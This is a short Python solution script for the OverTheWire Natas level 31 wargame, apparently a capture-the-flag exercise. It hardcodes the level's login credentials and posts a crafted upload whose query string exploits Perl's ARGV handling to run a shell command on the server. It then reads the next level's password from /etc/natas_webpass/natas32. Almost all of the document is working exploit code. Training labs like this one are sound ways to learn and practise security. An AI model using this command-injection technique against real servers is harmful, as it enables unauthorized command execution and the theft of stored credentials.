import requests

user = 'natas31'
passw = 'hay7aecuungiuKaezuathuk9biin0pu1'
url = 'http://%s.natas.labs.overthewire.org/' % user


def malc0de(cmd):
    injection_url = url + f'?{cmd} |'
    files = {'file': "test"}
    response = requests.post(injection_url,
                             files=files,
                             data={'file': 'ARGV', 'submit': 'Upload'},
                             auth=(user, passw),
                             #proxies={'http': 'http://127.0.0.1:8080'},
                             )
    return filter_response(response)


def filter_response(response):
    fltr = response.text[1522:]
    fltr = fltr[:-117]
    return fltr


print(malc0de("cat /etc/natas_webpass/natas32"))
